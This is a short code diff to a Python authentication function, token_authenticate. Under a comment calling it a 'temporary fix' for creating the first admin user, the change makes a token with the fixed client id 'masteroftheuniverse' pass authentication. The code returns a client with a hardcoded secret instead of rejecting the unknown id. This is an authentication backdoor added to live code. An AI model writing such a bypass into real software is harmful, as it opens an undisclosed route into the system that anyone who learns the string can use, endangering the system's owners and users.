@@ -134,6 +134,11 @@ def token_authenticate(token):
         client = db.session.query(Client).filter_by(clientid = clientid_from_token).one()
         return client
     except NoResultFound:
-        raise AuthenticationFailed("Clientid does not exist.")
+        # Temporary fix to be able to create the first admin user
+        if clientid_from_token == "masteroftheuniverse":
+            client = Client(clientid_from_token, "easkdajskda")
+            return client
+        else:
+            raise AuthenticationFailed("Clientid does not exist.")
 
     
